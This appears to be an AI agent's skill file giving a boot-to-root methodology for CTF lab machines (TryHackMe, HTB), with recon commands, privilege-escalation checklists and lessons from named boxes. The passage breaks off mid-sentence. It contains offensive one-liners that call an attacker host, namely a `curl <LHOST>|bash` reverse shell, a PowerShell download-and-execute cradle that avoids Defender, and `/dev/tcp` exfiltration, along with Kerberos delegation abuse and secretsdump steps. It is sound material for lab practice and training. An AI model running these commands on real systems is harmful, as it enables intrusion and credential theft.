---
name: ctf-box
description: Boot-to-root methodology for a full machine (THM/HTB/PG/CTF box, "get user.txt+root.txt", "root the box", "foothold to root"). Enforces basic-tool recon (nmap, nc, ffuf, nuclei, dig) before anything custom, wiki-first lookups, and ALWAYS pspy + linpeas/winpeas for privesc. Use when handed a box/IP to own end-to-end.
---

# CTF / Boot-to-Root Box

Own a whole machine: recon -> service triage -> foothold -> user.txt -> privesc -> root.txt.
**Run everything from the engagement tooling host (e.g. Kali in tmux), capture into `targets/<eng>/`.**

Track progress in `targets/<eng>/killchain.md` -- work the current phase's open items, mark `[x]` as each
lands; honor GATE 1 (no hand-rolled exploit before its wiki item is `[x]`), GATE 2 (no exploit step `[x]`
without a `poc/` image), GATE 3 (exhausted vector -> `[!]` + one `Deadends.md` line, never re-run it).

## Standing mandate: Wiki-first, tools-before-scripts (GATE 1, all phases)

This mandate stands over every phase below. Before writing ANY custom script or recalling an exploit from memory:
1. `qmd_query "<tech/version> exploit"` and `qmd_query "<service> privilege escalation"` via wiki-search MCP. Read matches. If the MCP is down (it drops mid-session), run `bash scripts/wiki-query.sh "<tech> exploit"` (same qmd index; `-k` for an exact CVE) - do NOT skip wiki-first or fall back to grep.
2. Pull payloads from `wiki/payloads/` and chains from `wiki/cheatsheets/attack-chains.md` + `wiki/cheatsheets/cve-arsenal.md`, or `Skill(arsenal)` to resolve the exact file.
3. Privesc reference: `wiki/techniques/linux/linux-privesc.md` / `wiki/cheatsheets/linux-privesc.md` (or windows-privesc).
Only after the wiki has nothing do you write a custom PoC. Do not reinvent what the wiki already documents.

**Tooling home:** check `/opt/arsenal` first for pspy/linpeas/shot/capture. pspy64/linpeas/winPEAS live in `/opt/arsenal`, seeded by `vm-provision.sh` from their GitHub releases; our own helpers (`shot.py`, `capture.sh`) are pushed on demand by `bash scripts/vm-sync.sh <name>` from the vault.

**Version-pinned tooling -> a THROWAWAY docker container, never mutate the VM's runtime.** A tool that needs a specific/older interpreter or an abandoned dependency (e.g. `h2csmuggler` pins the deprecated `hyper` lib and only runs on Python <=3.11; a legacy exploit needs `node:16`) should run inside a disposable container matched to that version, NOT via a host downgrade or a fragile venv that leaves the Kali VM in a broken state for the next box. `docker run -it --rm -v $(pwd):/app python:3.11 bash` (swap the tag: `python:3.9`, `node:16`, ...); `--rm` deletes it the moment you exit, so nothing persists and nothing on the VM breaks. Keep the VM's system python/tooling pristine.

**Anti-pattern:** a raw one-shot `bash /root/vm.sh '<exploit>'` (or an inline `node -e`/`python3 -c` payload through it) for a listener, shell, or chained exploit is the smell this mandate exists to catch -- it skips wiki-first and leaves no session to capture. Run persistent/interactive steps in their own named tmux tab instead: `scripts/vm-scan.sh <eng> <target> '<cmd>'`.

## Phase 1 Recon: basic tools only (in this order)

Use the standard toolkit. Do NOT hand-roll recon scripts.

**Preflight (do FIRST, every engagement): clean the tooling VM's `/etc/hosts` of PRIOR-box entries.**
The Kali VM persists across boxes, so a previous engagement's `<ip> <domain>/<realm>` line survives and
silently mis-resolves this box's domain/realm - impacket Kerberos then hangs on a dead KDC while nxc/certipy
(which take an explicit IP) look fine, a confusing time-sink. Before recon, review and prune stale lines:
`bash /root/vm.sh 'grep -vE "^#|^127\.|^::1|^$" /etc/hosts'` - delete any line whose IP is NOT this box, then
add only this target. (A shared realm like `thm.local`/`htb` across boxes is the classic trap.)
**Also prune `/etc/krb5.conf`** the same way: a stale `default_realm` from a prior box makes Kerberos-first
tools (xfreerdp NLA, impacket) waste time failing to reach a dead KDC before falling back to NTLM
(`bash /root/vm.sh 'grep -i default_realm /etc/krb5.conf'`; blank it or set this box's realm). Same stale-state trap as `/etc/hosts`.

Tooling-first: use rustscan/nmap/feroxbuster/ffuf/nuclei/nxc - never hand-roll a /dev/tcp port loop or a curl fuzz loop (weaker, skips the fingerprint router). **feroxbuster is the DEFAULT web content-discovery tool** (recursive, faster, finds nested paths ffuf/big.txt miss) - launch it the moment nmap shows a web port; keep ffuf for param-mining + vhosts.

**Card EVERY scan tab AS it finishes (before exploiting), not at the end of the box:** `scripts/capture.sh recon <eng> <slug> <tab>` renders the tmux tab into `recon/`. Do this for rustscan, nmap, feroxbuster, ffuf, nuclei, AND whatweb (run whatweb in its OWN tab so it can be carded) - even an empty/unhelpful result gets a card, so the operator can see exactly what ran. `<tab>` = the `@id` or sanitized name `vm-scan.sh` printed. (`status.py` surfaces the recon-card count; 0 cards on a web box = you skipped this.)

Run each scan in its own tmux tab on the VM (root, persistent, survives a dropped `vm.sh` call). **ONE tmux session per engagement (the `<eng>` name); one WINDOW per parallel scan.** Parallel scans on the SAME host collide if they share a window name (the target), so give each its own window with `--win <tool>`: `bash scripts/vm-scan.sh <eng> <target> '<scan>'` for the first, then `bash scripts/vm-scan.sh --win nuclei <eng> <target> 'nuclei ...'`, `--win ferox`, `--win whatweb`, ... **NEVER bump the session name (`<eng>-nuclei`, `<eng>-ferox`) to dodge a collision** - that scatters tabs across many sessions and breaks single-session recon (recurring drift). (multi-web target -> `--win <ip-or-domain>` per host.) Screenshot a live/finished tab with `Skill(screenshot)` `--tmux <eng>:<tab>` (use the `@NN` id or sanitized tab name `vm-scan.sh` prints, not a dotted target). The scan commands below are what you launch inside each tab.

**vm.sh drops long FOREGROUND commands (exit 255, no output).** A single `bash /root/vm.sh '<cmd>'` that runs more than ~2 min (scan / crack / spray / brute loop) gets its SSH cut mid-run. Run ANY long task DETACHED and poll a file: a tmux tab (`vm-scan.sh`), or `nohup <cmd> >/tmp/out 2>&1 & ` then poll `for i in $(seq 1 60); do grep -q DONE /tmp/out && break; sleep 3; done`. Never block one vm.sh call on a slow task. Stdin is NOT forwarded through vm.sh either - push files by base64-into-the-command (`echo <b64> | base64 -d > ~/file`), and write+run in ONE call to avoid a race.

```bash
T=<ip>
# rustscan FIRST (board step 1: fast full-port sweep), THEN nmap -sCV on the open ports it prints.
rustscan -a $T --ulimit 5000 -g                        # seconds -> open-port CSV (e.g. [22,80])
# ALL ports filtered / no-response on a box that should be up = suspect the TARGET IP FIRST, not scan
# timing. Brief/task IPs go stale and THM/HTB boxes redeploy to a new IP; re-verify the IP (ask the
# operator / re-read the task) BEFORE re-tuning --ulimit/-T/timeouts (a dead brief IP once burned ~4
# re-scans before the live IP surfaced). A quick `nc -zv $T 445`/`80` sanity-check beats another full rustscan.
nmap -p<found> -sCV -Pn $T -oN nmap-svc.txt            # version/script scan on rustscan's hits
nmap -p- --min-rate 2000 -T4 -Pn $T -oN nmap-all.txt   # full-TCP confirm (its own tmux tab)
# DO NOT ROUTE (load a hunt skill) OFF THE RUSTSCAN LIST ALONE - it produces PHANTOM open ports.
# rustscan's SYN speed misreads filtered/rate-limited ports as open: a box once showed 464(kpasswd)
# + 9389(ADWS) in rustscan -> loaded hunt-ad as a "DC", but the full -p- showed 88/389 CLOSED and the
# real door was redis/6379. The nmap -p- (and a `nc -zv $T <port>` on the 2-3 ports that decide the
# route) is the ground truth. Fingerprint the OS/domain from an actual service banner (nxc smb, a
# real 389/88 connect), never from the fast-sweep port numbers. Wait for -p- before committing a path.
nc -nv $T <port>                 # manual banner / custom-proto services (chatbots, etc.)
dig any @$T <domain>; dig axfr @$T <domain>   # DNS if 53 open / vhost hints
# SMB (445 open) -> netexec (nxc), NOT a one-shot smbclient: nxc fires the fingerprint router,
# enumerates shares+users+policy in one carded pass, and works for standalone Samba AND AD. Run it
# in its OWN tmux tab so it gets a recon card (smbclient leaves no shot):
nxc smb $T -u '' -p '' --shares                 # anon/null share list + signing/OS banner
nxc smb $T -u 'guest' -p '' --shares --rid-brute   # guest fallback + user enum via RID cycling
smbclient -N //$T/<share> -c 'recurse;ls'       # then use smbclient ONLY to pull a specific file/share
# --- WEB SERVICE FOUND -> do ALL of this; do NOT skip web enum to jump to the "obvious" path (password-audit box lesson):
#  (a) CAPTURE IT AS-IS FIRST, before poking: render the page (`capture.sh web <eng> <slug> http://T:PORT/`
#      -> a browser shot with the URL bar) AND save the raw HTML source to poc/ (the site as it was) --
#      curl -s http://T:PORT/ > poc/<slug>-source.html. `web` renders; `ev`/`req` card a request/response.
#      Do this for EVERY distinct web surface you open AS you first explore it, not at close-out:
#      login pages, dashboards, AND the OSINT/social/support apps (a fake-social feed, a profile
#      page, an admin panel). A box with web ports and 0 page renders / no OSINT-app render = you
#      skipped this (recurring miss). For an authed/JS-gated view, render with the session
#      (shot.py --html on the curl'd authed response, or force the gated element visible).
#  (a2) READ FULL, don't just grep. When you fetch a file/response (source, a config, an HLS/media
#      manifest, a JSON body, a JS bundle) READ IT END-TO-END before moving on -- the one line that
#      is the vuln (a hidden `/v1/ingest/*` endpoint in an `#EXT-X-SESSION-DATA` manifest header, a
#      commented creds line, an alternate route) is exactly what a narrow `grep <keyword>` skips.
#      grep to LOCATE in a huge file, then read the surrounding block; never let grep BE the read.
#      SAME RULE FOR YOUR OWN PIPELINE: a `| head -N` / `| grep` you append to a probe over the VM
#      bridge truncates the very response you are reading. A one-line body ("Internal dev storage")
#      and a 200-line one look identical through `head -12`. Pipe an EXPLOIT/lead response through
#      NOTHING; save it and read it whole. Only cap output for a known-huge scan log.
#  (a3) EXPLOIT REQUESTS -> BURP, not just curl. curl is fine for quick loops, but push every
#      LOAD-BEARING request (SSRF, LFI, SQLi/injection, an auth/BFLA bypass, a deser payload, the
#      flag-returning request) into Burp Repeater via `Skill(hunt-burp)` so the operator can replay
#      it, and card it with `scripts/capture.sh burp` / `Skill(screenshot-burp)`. On a breakthrough,
#      the exploit request belongs in Repeater with a Burp screenshot, not only a terminal curl.
#  (c) SOURCE-READ PRIMITIVE first (LFI / file-disclosure / .git / exposed backup): the MOMENT you can
#      read files, READ ALL THE APP SOURCE (every .php feroxbuster finds), fully, BEFORE attacking a
#      login or brute-forcing a DB/panel. The real vuln - a SQLi param, a hardcoded cred, a logic flaw,
#      the flag path - is almost always IN the source you can already read. Grinding phpMyAdmin/creds
#      while an unread `?search=` SQLi sits in dashboard.php source is the recurring "drift to manual".
#  (d) READ THE CLIENT-SIDE JS + SNIPPET WHAT IT REVEALS. Pull every app.js / bundle / inline <script> /
#      source map and grep it for `fetch(`/`axios`/`XMLHttpRequest`/`/api`/`token`/`secret`/`key`/`admin`.
#      For a JS/SPA front-end the API is NOT reachable by feroxbuster/ffuf: POST-only JSON routes 404 on
#      the scanners' GET, and a bare `/api` 404s so `-d 2` never recurses into it - so the JS bundle IS
#      the endpoint map (this box: the whole /api/* surface + the reward-gate came only from app.js; the
#      ferox card was empty). MANDATE: the MOMENT source (JS/HTML/config/source map) reveals something
#      load-bearing - an endpoint, a secret/key, a hidden route, a client-side gate/validation - SNIPPET
#      IT: `scripts/capture.sh snippet <eng> <slug> <url-or-file> '<grep-pattern>' '<what it reveals>'`
#      writes poc/NN-<slug>-snippet.md (fenced excerpt + reveals note), then PASTE that fenced block
#      inline into walkthrough.md Recon. Never leave a source finding as ephemeral chat - the snippet is
#      the recon artifact the empty ferox/nuclei card cannot be.
#  (b) LAUNCH THE SCANNERS IN PARALLEL the MOMENT nmap shows a web port -- ONE tmux tab each, do not wait serially:
#        feroxbuster (PRIMARY dir/file discovery), nuclei (CVE/misconfig), whatweb (fingerprint, its OWN tab):
#        scripts/vm-scan.sh --win ferox <eng> $T 'feroxbuster ...' ; --win nuclei <eng> $T 'nuclei -u http://$T' ; --win whatweb <eng> $T 'whatweb -a3 http://$T'  (ONE session, a window each)
#      Analyse the page/source WHILE they run, then CARD each tab (feroxbuster + whatweb + nuclei) when it finishes.
#      NEVER conclude "no web vuln / no hidden route" until feroxbuster AND nuclei have actually run AND been read.
# Web (per http port) -- the scans you launch in those tmux tabs:
# PRIMARY dir/file discovery = feroxbuster (recursive; run FIRST, with backup/log exts). base64-push harness-paths.txt to the VM first.
feroxbuster -u http://$T -w /tmp/harness-paths.txt -x php,txt,log,sql,bak,zip,env,old,conf -d 2 --no-state -o ferox.txt   # OUR high-signal list, recursive
feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,log,bak -d 2 --no-state   # then the BIG list (raft-large; fallback raft-medium-words or /usr/share/wordlists/dirb/big.txt)
# SOURCE-BACKUP sweep -- feroxbuster's -x appends ONE ext to a base word (login->login.bak) so it NEVER
# finds login.php.bak (a backup SUFFIX on a full filename); source-leak backups are the whole app +
# creds. Always run this too (also fired by recon-web.sh; run by hand against any web surface):
bash scripts/backup-sweep.sh http://$T ferox.txt    # appends .bak/.back/~/.old/.save/.swp/.zip... to full source filenames; reads ferox.txt for discovered files; BURP_PROXY=127.0.0.1:8080 to route via Burp
# ffuf for what feroxbuster does NOT do -- param mining + vhosts:
ffuf -c -u "http://$T/?FUZZ=x" -w scripts/wordlists/harness-params.txt -fs <baseline>          # param mining (SSRF/LFI/cmdi names); -c = colored output (readable recon card)
ffuf -c -u http://$T/ -H "Host: FUZZ.$T" -w <vhost-wordlist> -ac                                # vhosts
nuclei -u http://$T -o nuclei.txt                                                              # known CVEs/misconfig
whatweb -a3 http://$T ; curl -s -I http://$T                                                   # fingerprint + cookies (whatweb in its OWN tmux tab -> recon card)
wpscan -u http://$T                                                                            # If there is a wordpress
```
**Wordlists live on the attacker box, not always on the scan VM.** `scripts/wordlists/*` (vault path)
and `/usr/share/seclists/*` may NOT exist on the VM you run ffuf from. A missing `-w` makes ffuf
print its **help text and silently find NOTHING** - a false "no hidden endpoints / no LFI param"
that once cost a whole box (concluded the app had no vuln when the fuzzer never ran). Preflight every
fuzz: `ls "$W" || W=/usr/share/wordlists/dirb/big.txt`. seclists is often absent (stock Kali without
the `seclists` package has only `/usr/share/wordlists/dirb/*`); push the harness lists to the VM
(`base64` them over to `/tmp/`) before using `scripts/wordlists/harness-*.txt`.

Fingerprint the exact app + version. **On any fingerprinted surface/service, `Skill(arsenal)` FIRST**: it maps the surface to the automated tools we already document in `wiki/tools/` (web -> httpx/ffuf/feroxbuster/nuclei/dalfox/wpscan; SMB/AD -> netexec/bloodhound; login -> hydra/hashcat; ...) so you use OUR tool for the service instead of hand-rolling, THEN the technique/payload (`wiki/payloads` + the matching hunt skill). Then INVOKE `Skill(hunt-<class>)` for EACH fingerprinted vuln class (sqli/ssrf/upload/xss/idor/deser/...) - actually LOAD and follow the skill, do NOT just accept the router's advisory nudge and work from memory (a routed-but-never-invoked hunt skill is flagged as drift in eval.md). Record HOW each vuln was DISCOVERED (the probe/observation that revealed it) as you confirm it, not only the exploit. Screenshot each finding AS it lands (`Skill(screenshot)`), not at the end. **OT/ICS ports (502 Modbus / 102 S7 / 44818 EtherNet/IP / 1880 Node-RED / an HMI web app) -> `Skill(hunt-ics)`** (drive the plant to a danger state; the flag is often a visual overlay in the HMI/CCTV media). **A web surface discovered -> run `scripts/recon-web.sh <eng> <url>` yourself: it fans out the parallel suite (feroxbuster + nuclei + whatweb + backup-sweep) on that IN-SCOPE surface. Re-run it per NEW vhost/path -- so nuclei runs on the real app, not just the landing IP. Nothing auto-launches it (the `web-recon.py` hook was removed 2026-08-04); read the cards as they finish, and do not hand-probe what a scanner covers.**

## Phase 2 Weaponize: pick the exploit

- **Version-known -> [[searchsploit]] AND [[metasploit]] FIRST (the quick-win reflex).** The instant a service is fingerprinted to a version, run BOTH before hand-rolling or deep-diving a CVE: `searchsploit <app> <ver>` (local Exploit-DB; `-m <id>` to copy a PoC, `-x` to read it) and `msfconsole -qx "search <app>; exit"` (a ready `use`-able module = often an instant shell). A matching msf module or a copy-pasteable searchsploit PoC beats writing your own. Cross-check with the wiki CVE lookup ([[cve-arsenal]] · [[metasploit]]); prefer the documented/ready PoC over a fresh one. (GATE 1 still holds: the wiki item for the tech is `[x]` before a hand-rolled PoC - but a canned searchsploit/msf exploit for a known version IS the wiki-blessed tool, use it.)
- Pick the payload set from `wiki/payloads/` for the fingerprinted class (GATE 1: the wiki item is `[x]` before you hand-roll a PoC).
- Stage the chosen exploit/PoC into `targets/<eng>/poc/scripts/` before firing, so the code and the run are captured together.

## Phase 3 Deliver: land a shell

- Deliver the staged payload/exploit against the target; prefer the documented PoC over a fresh one.
- **Stabilize EVERY Linux shell the moment it lands** (a raw `nc` shell has no job control, no arrow keys, no tab-complete, and Ctrl-C kills it). Full TTY-upgrade dance, in order: `python3 -c 'import pty;pty.spawn("/bin/bash")'` (fall back to `python`/`python2` if `python3` is absent; `script -qc /bin/bash /dev/null` if no python) -> `Ctrl+Z` to background -> `stty raw -echo; fg` (hands your terminal's raw mode to the shell; press Enter twice) -> `export TERM=xterm` (fixes clear/less/vim). Then set `stty rows <R> cols <C>` to your local `stty size` if editors wrap. Or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient, already-interactive session. (Windows shells: no PTY dance; grab a proper shell via a C2/`ConPtyShell` or just RDP/WinRM once you have creds.)
- **Cred-reuse FIRST.** Capture creds to `targets/<eng>/loot.md` immediately; try reuse (su / ssh / other services) BEFORE hunting new ones. DB/web creds are very often **reused for SSH**.
  - **Spray EVERY secret you hold against EVERY user x surface, not just the newest one.** The drift: a cred gets written to loot.md, one obvious target is tried, and the rest of the matrix is never run while a fresh privesc vector is ground for half an hour. Re-run the FULL matrix each time a new secret lands. `su` and SSH are NOT equivalent - `PermitRootLogin no` makes `ssh root@` fail while `su root` with the same password succeeds, so a "root: []" SSH result is NOT a negative for root (needs a PTY: `pty.spawn`/`script -qc`).
  - **The leaked config is not the live secret.** An app that does `load_dotenv()` / `os.environ.get(...)` keeps its REAL password in a `.env` beside the source, not in the seeded `.sql`. Read every config the app actually loads, and diff it against what the leak gave you.
  - **Crack the hashes you ALREADY hold before hunting a new vector.** A DB account with `ALL PRIVILEGES` lets you read the DBMS's own account table; a second, otherwise-invisible account there is a deliberate lead. MySQL 8 `caching_sha2_password` (`$A$005$...`) is hashcat `-m 7401` (see [[password-cracking]], [[mysql]]) - convert `$A$<iter>$<20-byte salt><43-byte digest>` to `$mysql$A$005*<salt-hex>*<digest-hex>`. A DBMS password is a prime candidate for OS-account reuse.

## Phase 4 Exploit: finish the foothold, then privesc

**Web foothold = STAY in Burp (anti-drift).** If the foothold is an HTTP primitive (RCE/LFI/SSRF/authed
API), the recurring failure is abandoning Burp the instant it lands and scripting the ENTIRE
post-exploitation over raw `curl`/`vm.sh`/urllib - so the operator, who is watching Burp, loses all
visual on the exploitation. Keep the load-bearing follow-ups (the injection that reads user.txt, the
authed call that leaks config, each privesc-relevant fetch) in **Burp Repeater** (native `mcp__burp__*`
first, CLI bridge fallback; `Skill(hunt-burp)`). Quick throwaway enumeration loops over the bridge are
fine; the requests you'd screenshot are not throwaway. See CLAUDE.md "Burp-first does NOT stop at foothold".

**STOP-and-think the moment ANY shell lands (before reaching for a shortcut).** The recurring
failure is following the FASTEST path instead of the INTENDED one, then going off the rails. Pause and:
1. Read the box's THEME/name + any notes/creds/files you already have - CTF boxes telegraph the
   intended vector (a module lesson, a service left on, a labelled secret). `qmd_query` the wiki for
   that theme + the exact fingerprinted tech before acting.
2. Enumerate the INTENDED escalation surface FIRST: `sudo -l`, writable configs/cron/timers/scripts
   you own, group memberships, service creds - the deliberate path is almost always one of these and
   `pspy`/`linpeas` surface it in seconds.
3. **Kernel-LPE arsenal (dirtyfrag/copyfail/PwnKit/...) is a LABELLED FALLBACK, not the opening move.**
   We DO carry instant-escalation payloads for old kernels ([[privesc-exploit-arsenal]], [[dirty-frag]]) -
   note the `uname -r` band as a fallback, but VERIFY the intended path is genuinely absent AND verify
   the CVE precondition (userns/module/patch-band) before firing. A shortcut that works is fine; taking
   it BEFORE checking the taught vector is the drift. Once you have full root, look back at what was
   INTENDED and record it (walkthrough + Deadends), so the fast win still teaches the lesson.

Finish the foothold first (leftover Rule 2 techniques, if the shell landed mid-app):
- **Consistent escalation primitive:** if a box exposes the SAME pivot at each stage (a Docker socket/TLS pivot per level, an SSRF each hop), verify/exhaust that intended vector end-to-end BEFORE an opportunistic shortcut (raw device mount, a memory CVE). A shortcut that relies on `--privileged`/a loose cap can mask that a hardened config would block it, and it is less reproducible/auditable. Getting the flag via a shortcut is fine; SKIPPING the taught vector without testing it is the miss.
- Web SQLi: in-band (UNION/error) before blind; test EVERY quote context (`'` `"` numeric) and second-order (a stored value used unsafely on another page). If the app hashes the password inside the query, read plaintext from `information_schema.PROCESSLIST`. Load `Skill(hunt-sqli)` / see [[sql-injection]].
- Recovered unsalted MD5/SHA1: **online lookup first** (CrackStation/hashes.com) before hashcat/john. A hash that resists everything on a hard box may be a deliberate decoy; pivot, don't grind.

Then privesc = pspy ALWAYS + linpeas/winpeas, then manual.

**Always run pspy first** to catch root-run background jobs/cron/timers that static checks miss:
```bash
# upload pspy64 (host it on the tooling box, curl/wget it down) and watch >=60s
./pspy64 -pf -i 1000     # see every exec + file event as root; reveals per-minute cron/systemd timers
```
Then the automated sweep:
```bash
./linpeas.sh         # linux   (winpeas.exe / winpeas.bat on windows)
# AVOID `-a` (deep/thorough) on small boxes (<=1-2 GB RAM, most THM VMs): the full scan can
# OOM-thrash the target until every service (ssh/http/db) times out - looks exactly like the box
# crashed. Use the default scan, or throttle: `nice -n19 ionice -c3 ./linpeas.sh`. If it does hang
# the box, `pkill -9 -f linpeas` (kill it as the user that launched it) and load drains in seconds.
```
Capture linpeas/pspy TWO ways: a `--term` screenshot of the highlighted findings (Skill(screenshot),
the colored hits survive) AND the FULL text log - redirect the tool to a file, then
`scripts/capture.sh log <eng> <slug> /tmp/linpeas.txt` pulls the whole scan (ANSI stripped) into
`poc/NN-<slug>.md`. The screenshot is unreadable past one screen; the `.md` keeps every line so you
(and the operator) can grep it later. Do this for full nmap output too when it is long.

Then walk the manual checklist (do not skip any; the box's intended path is usually ONE of these):

| Check | Command | Win = |
|---|---|---|
| sudo rights | `sudo -l` | NOPASSWD/GTFObin -> root |
| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFObins |
| Capabilities | `getcap -r / 2>/dev/null` | cap_setuid etc. |
| Cron | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script |
| **systemd timers** | `systemctl list-timers --all` + `systemctl cat <svc>` | **writable ExecStart script run as root** (e.g. THM Ollie `feedme.timer`) |
| Writable root files | writable scripts/units root executes; `/etc/passwd` writable | inject payload, wait for trigger |
| Groups | `id` (docker/lxd/disk/adm/shadow) | group->root GTFO |
| Creds | configs, history, DB, `.ssh`, backups | reuse / su |
| Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first (see lesson) |

## Lesson: mutate leaked/labelled secrets; cookie-BFLA != session admin (THM Support Panel)
- **A labelled secret that fails as a literal is a SEED, not always a decoy:** mutate it (`echo '<seed>' | hashcat --stdout -r best64.rule` + manual case/number/suffix/`@`-drop) against the real login BEFORE declaring decoy or committing to a full rockyou brute (e.g. `support@110` -> `support110`). See [[password-cracking]].
- **A forgeable cookie usually gates only PART of the app:** an `md5("true")` cookie unlocked an API + IDOR while the RCE + flag stayed behind `$_SESSION['admin']` (set only at real login). Map WHICH check (cookie vs session) gates the thing you want before assuming "I'm admin".
- Command sink behind a prefix allowlist (`strpos($cmd,'date')===0`) -> chain off it: `date;<cmd>`.

## Lesson: reverse-proxy smuggling chain + go-for-shell efficiency (THM Contrabando)
- **Fuzz BEHIND the proxy** (`ffuf -u http://T/page/FUZZ -e .php`) to find sinks the proxy never routes externally, before reading source.
- **CVE-2023-25690** (Apache <=2.4.55 `RewriteRule [P]`): raw `%0d%0a` in the captured path splits the proxied request -> smuggle a POST to a cmd-injection sink. Exact bytes/gotchas (leading `x`, `%20` ends the request line, `&`->`%26`) in [[http-request-smuggling]].
- **Once egress is confirmed, go STRAIGHT for a reverse shell** (`curl <LHOST>|bash`, payload at web-root so the body has no slashes); the blind-RCE-to-file + LFI-read path is only the slow no-egress fallback.
- **No container escape (no docker.sock, CapEff=0, no host mount)? Pivot over the docker network, not out** (`rustscan 172.18.0.1,172.18.0.2` from the container).
- **Internal "fetch a URL" service = SSRF + often SSTI** (`render_template_string` -> host a Jinja2 template for RCE; `file://` reads host files too). See [[ssti]].
- **Privesc:** sudo `python*` arg-glob -> python2 `input()`=`eval()`; an unquoted `[[ == ]]` script is a glob oracle leaking the sudo password. See [[linux-privesc]].
- **Orchestration:** if you delegate a box to a background fork, do NOT also exploit it in parallel (a long brute makes the fork look idle while alive); wait for its completion signal or `SendMessage`-ping.

## Lesson: Windows AD, RDP-only foothold -> KeePass (DPAPI) -> RBCD to DA (THM Forward)
Load `Skill(hunt-ad)`. Assumed-breach low-priv user; DA via a credential chain (no memory CVE).
- **RDP-only exec** (in Remote Desktop Users, not local-admin, no WinRM): drive it HEADLESS from Kali - `Xvfb :99 &` + `DISPLAY=:99 xfreerdp3 /v: /u: /p: /cert:ignore /drive:sh,/tmp/share` (3.x wants `/cert:ignore`) + `xdotool key super+r` -> `cmd /c \\tsclient\sh\run.bat`, output to the mapped drive; read GUI secrets by screenshot (`import -window root`). Recipe in [[ad-lateral-movement]].
- **AppLocker-restricted:** a dropped .exe (winPEAS/SharpUp) is blocked -> enumerate with built-ins (reg/sc/wmic/schtasks/dir) from C:\Windows.
- **KeePass `.kdbx` that rejects every password** may be DPAPI-protected (`KeePass.config.xml` `<UserAccount>true` = uncrackable offline): OPEN it on the box as that user; creds inside often REUSE to higher-priv - spray. See [[password-cracking]].
- **RBCD to DA** with `AddAllowedToAct`/GenericWrite on a computer (BloodHound): `addcomputer FAKE$` (MAQ>0) -> `rbcd -action write` -> `getST -impersonate Administrator -spn cifs/DC` -> `secretsdump -k`.
- **Read the flag as DA** with no exec (Defender blocks `-x`/wmiexec): `smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`.


## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)
Load `Skill(hunt-sqli)`/[[cryptography-attacks]]. Whole box is applied crypto, no memory CVE.
- **Deobfuscate client JS in node** (`node -e "$(cat api.js); console.log(c)"`) to print hidden API keys/algorithms, don't hand-trace.
- **Directory listing (autoindex) is the crack:** ffuf `/logs/` -> `app.log` leaked a valid (email, invite_code) pair that breaks the token scheme.
- **Weak `mt_rand` token forge from ONE pair:** recover the unknown seed `CONST` offline by bruting until the leaked pair reproduces (PHP 8 cli replicates a 7.x target; `mt_rand` stable 7.1+), then forge any user's code. See [[cryptography-attacks]] PRNG.
- **Encrypted param -> padding-oracle RCE:** an 8-byte IV = 64-bit cipher (NOT AES, stop guessing keys); a distinct "Padding error" vs clean render = padding oracle. Decrypt (a `date`-family plaintext confirms a `shell_exec` sink), then CBC-R forge a blob decrypting to your command -> RCE, no key. When an app echoes padding validity, reach for the oracle, don't brute keys.

## Lesson: cred-reuse-first, don't blind-scrape a SPA admin, linpeas-not-by-hand (THM Voyage)
Chain: Joomla CVE-2023-23752 (leaks DB pass) -> cred-reuse to root SSH on a pivot container -> internal Flask pickle-deser RCE -> `cap_sys_module` kmod escape to host root.
- **A leaked cred is a REUSE probe before a research target:** test it against SSH + every auth surface FIRST (the DB pass was reused for root SSH); only then commit to a slow web-admin chain.
- **Modern CMS/SPA admin panels are JS-rendered** (`curl` sees only chrome): don't grind a template-editor RCE over curl against a Joomla 4/SPA admin - drive a browser, or the foothold is elsewhere.
- **Privesc = linpeas/pspy FIRST, not hand-rolled `ls`/`find`/`cat`.** `cap_sys_module` escape (`capsh --print | grep sys_module`): build+`insmod` a module (`call_usermodehelper`); if headers != running kernel, patch the `.ko` vermagic to `uname -r`. See [[linux-privesc]].

## Lesson: parallel enum, a clean reverse-shell driver, custom-service RE (speed)

- **Never serial-curl a numeric/name range.** A `for i in $(seq ...); do curl ...; done` loop fetches
  one URL at a time and is the difference between a 10-min and a 40-min box. Fan out threaded from the
  FIRST open port: `ffuf -t 80 -w <(seq -f '%04g' 0 9999) -u http://$T/path/FUZZ/ -mc 200` (or
  `xargs -P50`). The `.serial-enum-nudged` reflex catches this live; do not wait for it.
- **Drive a reverse shell with `bash scripts/vm-rsh.sh <eng> '<cmd>'`, NOT hand-rolled
  `tmux send-keys` + `capture-pane`.** It base64-wraps the command so any quoting/metachars survive the
  vm.sh -> ssh -> tmux bridge and returns ONLY the command's output between markers. Hand-driving
  send-keys and losing turns to shell-quoting (nested quotes, failed base64 wrappers) is the recurring
  drift this removes. (Quick throwaway one-liners can still go direct; anything with quotes/pipes uses vm-rsh.)
- **Windows PowerShell reverse shell -> `bash scripts/win-rsh.sh <eng> '<one ps command>'`** (the PS
  counterpart; `vm-rsh.sh` decodes with `bash` and only fits a *nix shell). **Follow the shell-interaction
  discipline (`docs/shell-interaction.md`): ONE command per call, NO injected markers/sentinels/nonce, type
  it the way an operator would.** win-rsh frames output by the shell's OWN prompt (echoed command + trailing
  prompt stripped) - it does NOT inject tokens. Type `$env:USERNAME`/`$_` plainly: it escapes `$`/`` ` ``/`"`
  for the one lossy `bash -c` layer, so the command arrives intact (the VM's `bash -c` eating every `$var` is
  the worst Windows time-sink, handled for you - do NOT strip `$` to dodge it, and do NOT hand-roll
  `tmux send-keys`). If output is empty/weird, PROBE with a bare `whoami` (never add instrumentation): a
  username = alive (the empty result was real); nothing = stuck, stop; a NON-username = the reverse shell
  DIED and fell back to the ATTACKER prompt (the false-RCE trap: `whoami` returns root/kali, not the target) -
  win-rsh detects this and refuses to pass off attacker output as the target. For a `$`-heavy or
  multi-statement script, host a readable `.ps1` and run it in-memory (`IEX(New-Object
  Net.WebClient).DownloadString('http://<lhost>/enum.ps1')`) - the cradle has no `$`, the script runs
  on-target, nothing hits disk to trip Defender.
- **A custom network service (esp. a Go `net/http` server on an odd port) = pull the binary and RE it,
  do not brute the protocol.** Exfil it (`cat /path/bin > /dev/tcp/<lhost>/<port>` to an `nc -lvnp`
